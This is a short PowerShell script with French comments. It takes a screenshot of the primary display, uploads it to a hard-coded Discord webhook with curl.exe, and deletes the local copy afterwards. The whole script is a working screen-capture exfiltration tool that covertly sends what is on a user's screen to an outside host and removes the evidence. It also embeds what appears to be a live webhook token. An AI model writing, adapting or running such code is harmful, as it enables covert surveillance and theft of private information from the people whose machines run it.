# 1. Configuration
$webhookUrl = "https://discord.com/api/webhooks/1450922309891391652/j_WkuEvDxWSNpICu5KBccsK1r4-nfRrIfZatPGyUPTQRWAQ9C0EZ3YXu2v5XgStzodPd"
$screenshotPath = "$env:TEMP\screen.png"

# 2. Capture d'écran
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$bitmap = New-Object System.Drawing.Bitmap -ArgumentList $screen.Bounds.Width, $screen.Bounds.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $bitmap.Size)
$bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()

# 3. Envoi vers Discord (Syntaxe simplifiée pour éviter les erreurs de guillemets)
try {
    # On envoie juste le fichier, Discord affichera le nom du fichier par défaut
    & curl.exe -F "file=@$screenshotPath" $webhookUrl
    Write-Host "`nSucces : Image envoyee." -ForegroundColor Green
}
catch {
    Write-Host "`nErreur : $($_.Exception.Message)" -ForegroundColor Red
}

# 4. Nettoyage
if (Test-Path $screenshotPath) { Remove-Item $screenshotPath }
